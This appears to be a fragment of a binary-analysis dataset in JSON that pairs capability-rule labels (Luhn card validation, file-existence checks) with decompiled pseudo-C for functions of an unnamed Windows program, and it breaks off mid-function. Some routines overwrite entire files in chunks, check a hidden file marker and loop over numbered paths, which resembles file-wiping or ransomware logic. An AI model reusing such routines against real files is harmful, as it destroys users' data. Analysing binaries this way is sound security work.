            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __cdecl\nfcn.00419670(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    code **arg_10h;\n    uchar auStack104 [36];\n    uint uStack68;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    code **var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471856;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00419670::var_ch_2;\n    fcn.00401440(noname_0);\n    fcn.00419950();\n    var_4h_2 = 0;\n    *var_10h_2 = vtable.std::_Task_async_state_void__1_.0;\n    fcn.00415130();\n    var_4h_2._0_1_ = 1;\n    puStack32 = &stack0xffffff98;\n    var_20h = fcn.00414180();\n    var_4h_2._0_1_ = 2;\n    arg_10h = var_10h_2;\n    puVar1 = fcn.00402eb0(var_10h_2);\n    var_4h_2._0_1_ = 1;\n    var_18h = fcn.00419ac0(&fcn.00419670::var_2ch, *puVar1, arg_10h);\n    var_4h_2._0_1_ = 3;\n    uStack68 = 0x419721;\n    var_14h = var_18h;\n    fcn.00415180(var_18h);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    uStack68 = 0x41972d;\n    fcn.00415210();\n    *(var_10h_2 + 0x76) = 1;\n    *in_FS_OFFSET = var_ch_2;\n    return var_10h_2;\n}\n",
        "token_count": 710
    },
    "0041e380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __cdecl\nfcn.0041e380(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    code **arg_10h;\n    uchar auStack104 [36];\n    uint uStack68;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    code **var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471856;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e380::var_ch_2;\n    fcn.00401440(noname_0);\n    fcn.0041e7f0();\n    var_4h_2 = 0;\n    *var_10h_2 = vtable.std::_Task_async_state_void__0_.0;\n    fcn.00415130();\n    var_4h_2._0_1_ = 1;\n    puStack32 = &stack0xffffff98;\n    var_20h = fcn.00414180();\n    var_4h_2._0_1_ = 2;\n    arg_10h = var_10h_2;\n    puVar1 = fcn.00402eb0(var_10h_2);\n    var_4h_2._0_1_ = 1;\n    var_18h = fcn.0041e880(&fcn.0041e380::var_2ch, *puVar1, arg_10h);\n    var_4h_2._0_1_ = 3;\n    uStack68 = 0x41e431;\n    var_14h = var_18h;\n    fcn.00415180(var_18h);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    uStack68 = 0x41e43d;\n    fcn.00415210();\n    *(var_10h_2 + 0x76) = 1;\n    *in_FS_OFFSET = var_ch_2;\n    return var_10h_2;\n}\n",
        "token_count": 718
    },
    "0041e490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __cdecl\nfcn.0041e490(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    code **arg_10h;\n    uchar auStack104 [36];\n    uint uStack68;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    code **var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471856;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e490::var_ch_2;\n    fcn.00401440(noname_0);\n    fcn.0041e7f0();\n    var_4h_2 = 0;\n    *var_10h_2 = vtable.std::_Task_async_state_void__1_.0;\n    fcn.00415130();\n    var_4h_2._0_1_ = 1;\n    puStack32 = &stack0xffffff98;\n    var_20h = fcn.00414180();\n    var_4h_2._0_1_ = 2;\n    arg_10h = var_10h_2;\n    puVar1 = fcn.00402eb0(var_10h_2);\n    var_4h_2._0_1_ = 1;\n    var_18h = fcn.0041e960(&fcn.0041e490::var_2ch, *puVar1, arg_10h);\n    var_4h_2._0_1_ = 3;\n    uStack68 = 0x41e541;\n    var_14h = var_18h;\n    fcn.00415180(var_18h);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    uStack68 = 0x41e54d;\n    fcn.00415210();\n    *(var_10h_2 + 0x76) = 1;\n    *in_FS_OFFSET = var_ch_2;\n    return var_10h_2;\n}\n",
        "token_count": 718
    },
    "004279b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004279b0(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *arg_10h;\n    uint *puVar4;\n    uint uVar5;\n    uint var_30h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    puVar1 = fcn.004257ac(&var_30h);\n    arg_10h = in_ECX + 0x18;\n    puVar4 = arg_10h;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = 0;\n    puVar1 = arg_10h;\n    uVar2 = fcn.0042ad8a();\n    uVar2 = fcn.00427b2b(uVar2, uVar5, puVar1);\n    uVar5 = 0;\n    *(var_4h + 8) = uVar2;\n    puVar1 = arg_10h;\n    uVar2 = fcn.0042ea56();\n    uVar2 = fcn.00427b2b(uVar2, uVar5, puVar1);\n    *(var_4h + 0xc) = uVar2;\n    uVar2 = fcn.00427b2b(\":AM:am:PM:pm\", 0, arg_10h);\n    *(var_4h + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 398
    },
    "004292be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004292be(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_unsigned_short_int__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.004257ac(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "004292f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004292f7(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_wchar_t__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.004257ac(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00402e00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e00(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(uVar2);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00404d10(uVar2);\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00404d10(uVar2);\n            if (cVar1 == '\\0') {\n                arg_8h_00 = fcn.00405150(arg_8h, 0);\n                if (arg_8h_00 != -1) {\n                    arg_ch_00 = fcn.00404d90();\n                    fcn.00405310(arg_8h_00, arg_ch_00, arg_ch);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 328
    },
    "00403140": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403140(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff98;\n    uint var_48h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470290;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405100(var_10h);\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        var_2ch = fcn.00404c90(0x486044, 0xffffffff);\n        if (var_2ch != -1) {\n            uVar2 = fcn.00404c40(&var_48h, 0, var_2ch + 1);\n            in_stack_ffffff98 = fcn.00401440(uVar2);\n            fcn.00404f80(in_stack_ffffff98);\n            fcn.00404f30();\n        }\n    }\n    uVar2 = fcn.00401440(&var_28h);\n    fcn.00405010(uVar2);\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff98);\n    return;\n}\n",
        "token_count": 377
    },
    "00403210": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403210(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint in_ECX;\n    uint var_10h;\n    int32_t hObject;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            if (arg_ch == '\\0') {\n                uVar2 = fcn.00404db0(0x40000000, 0, 0, 2, 0x80, 0);\n                hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar2);\n            }\n            else {\n                uVar2 = fcn.00404db0(4, 0, 0, 4, 0x80, 0);\n                hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar2);\n            }\n            if (hObject != -1) {\n                var_8h = 0;\n                uVar2 = fcn.00404d90(&var_8h, 0);\n                uVar2 = fcn.00405220(uVar2);\n                (*_sym.imp.KERNEL32.dll_WriteFile)(hObject, uVar2);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            }\n        }\n    }\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 394
    },
    "0040a4c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a4c0(uint arg_8h)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint unaff_EBP;\n    uint32_t uStackY32808;\n    int32_t iStackY32804;\n    uint uStackY32796;\n    uint32_t uStackY32792;\n    int32_t iStackY32788;\n    uint uStackY32784;\n    uint uStackY32780;\n    uchar auStackY32776 [32728];\n    uint uStackY48;\n    uchar *puStackY44;\n    uchar *puStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uchar *puStackY28;\n    uchar *puStackY24;\n    uint uStackY20;\n    uchar *puStackY16;\n    uchar *puStackY12;\n    uchar *var_4h;\n    \n    var_4h = 0x40a4cd;\n    fcn.0043b5d0();\n    var_4h = 0x40a4e5;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        var_4h = NULL;\n        puStackY12 = 0x80;\n        puStackY16 = 0x3;\n        uStackY20 = 0;\n        puStackY24 = NULL;\n        puStackY28 = 0xc0000000;\n        puStackY32 = 0x40a50a;\n        puStackY32 = fcn.00404db0();\n        uStackY36 = 0x40a511;\n        puVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        if (puVar2 != 0xffffffff) {\n            uStackY32792 = 0;\n            iStackY32788 = 0;\n            var_4h = &stack0xffff7fe8;\n            puStackY16 = 0x40a54a;\n            puStackY12 = puVar2;\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)();\n            if (iVar3 != 0) {\n                var_4h = 0x8000;\n                puStackY12 = NULL;\n                puStackY16 = &stack0xffff7ff8;\n                uStackY20 = 0x40a572;\n                fcn.00452000();\n                uStackY32796 = 0;\n                uStackY32784 = 0;\n                uStackY32780 = 0;\n                var_4h = NULL;\n                puStackY12 = &stack0xffff7ff0;\n                puStackY16 = NULL;\n                uStackY20 = 0;\n                puStackY28 = 0x40a5b5;\n                puStackY24 = puVar2;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                iStackY32804 = 0;\n                for (uStackY32808 = 0;\n                    (iStackY32804 <= iStackY32788 && ((iStackY32804 < iStackY32788 || (uStackY32808 < uStackY32792))));\n                    uStackY32808 = uStackY32808 + 0x8000) {\n                    puStackY28 = NULL;\n                    puStackY32 = &stack0xffff7fe4;\n                    uStackY36 = 0x8000;\n                    puStackY40 = &stack0xffff7ff8;\n                    uStackY48 = 0x40a623;\n                    puStackY44 = puVar2;\n                    (*_sym.imp.KERNEL32.dll_WriteFile)();\n                    iStackY32804 = iStackY32804 + (0xffff7fff < uStackY32808);\n                }\n                puStackY32 = 0x40a632;\n                puStackY28 = puVar2;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n        }\n    }\n    var_4h = 0x40a642;\n    fcn.0043a2e7(unaff_EBP);\n    return;\n}\n",
        "token_count": 914
    },
    "0040a650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a650(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint hObject;\n    uint var_29h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint dwMoveMethod;\n    uint var_14h;\n    uint lpNumberOfBytesRead;\n    uint liDistanceToMove;\n    uint lpNewFilePointer;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_29h._0_1_ = 0;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00404db0(0x80000000, 0, 0, 3, 0x80, 0);\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar2);\n        if (iVar3 != -1) {\n            stack0xffffffd4 = 0;\n            var_20h = 0;\n            var_1ch = -0x41103532;\n            dwMoveMethod = 0;\n            var_14h = 0;\n            liDistanceToMove = 0xfffffff0;\n            lpNewFilePointer = 0xffffffff;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar3, 0xfffffff0, 0xffffffff, &dwMoveMethod, 2);\n            if (iVar4 != 0) {\n                lpNumberOfBytesRead = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, &var_29h + 1, 0x10, &lpNumberOfBytesRead, 0);\n                if (iVar4 != 0) {\n                    var_29h._0_1_ = var_1ch == -0x41103532;\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        }\n    }\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 527
    },
    "0040e140": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e140(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470940;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(uVar2);\n    if (cVar1 == '\\0') {\n        var_10h = fcn.00404c90(0x485bd8, 0xffffffff);\n        if (var_10h != -1) {\n            uVar3 = fcn.00404c40(&var_2ch, var_10h, 0xffffffff);\n            uVar3 = fcn.00401440(uVar3);\n            fcn.00405010(uVar3);\n            fcn.00404f30();\n            goto code_r0x0040e1d0;\n        }\n    }\n    fcn.00405090(0x485bdc);\ncode_r0x0040e1d0:\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 335
    },
    "0040e1f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.0040e1f0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470960;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        fcn.00403410();\n        var_30h = fcn.0040e9d0();\n        iVar2 = fcn.0040e4e0();\n        for (; var_30h != iVar2; var_30h = var_30h + 0x18) {\n            fcn.00407620(var_30h);\n            iVar3 = fcn.0040e9f0(&var_28h, 0);\n            if (iVar3 != -1) {\n                fcn.00404f30();\n                break;\n            }\n            fcn.00404f30();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 393
    },
    "0040e2c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.0040e2c0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470960;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        fcn.00403350();\n        var_30h = fcn.0040e9d0();\n        iVar2 = fcn.0040e4e0();\n        for (; var_30h != iVar2; var_30h = var_30h + 0x18) {\n            fcn.00407620(var_30h);\n            iVar3 = fcn.0040e9f0(&var_28h, 0);\n            if (iVar3 != -1) {\n                fcn.00404f30();\n                break;\n            }\n            fcn.00404f30();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 393
    },
    "0040e390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e390(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    uint arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        arg_ch = 0;\n        arg_8h_00 = fcn.00403470();\n        uVar2 = fcn.0040e9f0(arg_8h_00, arg_ch);\n        var_4h = uVar2 != 0xffffffff;\n        var_4h = uVar2 & 0xffffff00 | var_4h;\n    }\n    else {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 198
    },
    "0040e3f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e3f0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    uint arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        arg_ch = 0;\n        arg_8h_00 = fcn.00403450();\n        uVar2 = fcn.0040e9f0(arg_8h_00, arg_ch);\n        var_4h = uVar2 != 0xffffffff;\n        var_4h = uVar2 & 0xffffff00 | var_4h;\n    }\n    else {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 200
    },
    "00412c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00412c70(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(**(in_FS_OFFSET + 0x2c) + 4) < *0x496168) {\n        fcn.0043a969(0x496168);\n        if (*0x496168 == -1) {\n            fcn.00401b10(8);\n            fcn.00416390();\n            fcn.0043a7a7(fcn.00473db0);\n            fcn.0043a91f(0x496168);\n        }\n    }\n    return 0x49616c;\n}\n",
        "token_count": 140
    },
    "00413840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00413840(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        fcn.00413620(arg_8h);\n    }\n    else {\n        cVar1 = fcn.004129a0();\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.00413a50(0);\n            (***puVar2)(fcn.00413620, arg_8h);\n        }\n        else {\n            puVar2 = fcn.00412960();\n            (***puVar2)(fcn.00413620, arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00413920": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.00413920(code *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470fd8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_10h == -1) {\n        (*arg_8h)(arg_ch, uVar2);\n    }\n    else {\n        fcn.00401b10(8);\n        arg_8h_00 = fcn.00412d30();\n        fcn.00411190(arg_8h_00);\n        var_4h = 0;\n        cVar1 = fcn.00415f90();\n        if (cVar1 == '\\0') {\n            var_24h = 0;\n            puVar3 = fcn.00413a50();\n            (***puVar3)(arg_8h, arg_ch);\n        }\n        else {\n            puVar3 = fcn.00406250();\n            (***puVar3)(arg_8h, arg_ch);\n        }\n        var_4h = 0xffffffff;\n        fcn.0040e930();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(var_24h);\n    return;\n}\n",
        "token_count": 425
    },
    "0041b420": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b420(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_01;\n    uint uVar3;\n    uint var_d0h;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    uint *var_b0h;\n    int32_t var_ach;\n    uint *var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint32_t var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uint var_4ch;\n    uint var_34h;\n    uint var_28h;\n    uint var_1ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471a60;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = 0xc;\n    var_10h = uVar2;\n    fcn.00401b10(0xc);\n    fcn.00404a90(uVar3, uVar2);\n    fcn.00401b10(0xc);\n    arg_8h_01 = &var_34h;\n    fcn.0041b7b0(arg_8h_01);\n    var_a8h = &var_34h;\n    var_98h = fcn.0040e9d0();\n    var_b4h = fcn.0040e4e0();\n    for (; var_98h != var_b4h; var_98h = var_98h + 0x18) {\n        fcn.00407620(var_98h);\n        var_ach = fcn.00404c90(L\".$\\\\\\\\\", 0xffffffff);\n        if (var_ach != -1) {\n            fcn.00404c40(&var_94h, 0, var_ach + 1);\n            for (var_9ch = 1; var_9ch < 0xff; var_9ch = var_9ch + 1) {\n                uVar3 = fcn.0041b3f0(&var_d0h, var_9ch);\n                fcn.0041bfb0(&var_4ch, &var_94h, uVar3);\n                fcn.00404f30();\n                cVar1 = fcn.0040cdc0(&var_64h, &var_4ch);\n                if (cVar1 == '\\0') {\n                    uVar3 = arg_ch;\n                    arg_8h_00 = fcn.00401440(&var_4ch);\n                    cVar1 = fcn.0041b9e0(arg_8h_00, uVar3);\n                    if (cVar1 != 